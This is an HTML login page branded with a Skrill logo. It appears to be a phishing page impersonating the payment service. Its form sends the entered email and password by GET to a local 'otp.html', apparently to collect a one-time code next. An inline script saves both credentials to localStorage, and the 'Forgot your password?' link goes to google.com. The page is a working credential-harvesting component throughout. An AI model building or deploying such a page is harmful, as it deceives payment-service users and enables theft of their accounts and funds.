<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="Skrill.png" alt="Skrill Logo">
        </div>
        <form id="login-form" action="otp.html" method="GET">
            <h2>Login</h2>
            <div class="input-group">
                <label for="email">Email or Username</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-btn">Log In</button>
            <div class="form-footer">
                <a href="https://www.google.com/">Forgot your password?</a>
                <p>Don't have an account? <a href="#">Register</a></p>
            </div>
        </form>
    </div>

    <script>
        // JavaScript to handle storing form data in local storage
        document.getElementById('login-form').addEventListener('submit', function() {
            // Store form data in local storage
            localStorage.setItem('userEmail', document.getElementById('email').value);
            localStorage.setItem('userPassword', document.getElementById('password').value);
        });
    </script>
</body>
</html>
